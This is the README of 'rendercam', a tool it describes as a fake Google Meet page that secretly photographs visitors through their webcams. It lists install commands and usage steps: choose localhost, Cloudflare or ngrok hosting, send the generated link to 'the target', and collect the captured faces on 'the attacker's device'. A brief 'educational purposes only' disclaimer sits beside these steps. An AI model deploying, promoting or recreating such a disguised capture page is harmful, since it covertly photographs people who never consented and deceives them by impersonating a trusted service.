# rendercam

A website disguised as Google Meet that secretly captures user's faces.

**Disclaimer:** This project is for educational purposes only. Do not use it for malicious activities.

## Setup

1.  Clone the repository:

    ```bash
    git clone https://github.com/render437/rendercam.git
    cd rendercam
    ```

2.  Create a virtual environment:

    ```bash
    python3 -m venv venv
    ```

3.  Activate the virtual environment:

    ```bash
    source venv/bin/activate
    ```

4.  Install the dependencies:

    ```bash
    pip install flask opencv-python localxpose pyngrok
    ```

5.  Run the main script:

    ```bash
    python3 main.py
    ```

## Usage

1.  The script will guide you through the setup.
2.  You will be prompted to enter the number of pictures to take.
3.  You will be prompted to choose a hosting method:
    *   `localhost`
    *   `cloudflare`
    *   `ngrok`
4.  The script will automatically install dependencies and set up the chosen hosting method.
5.  Share the generated URL with the target.
6.  Captured images will be saved in the `captured_images` directory on the attacker's device.

**Note:** Make sure you have Python 3 installed and up-to-date. Remember to activate the virtual environment before running the script.
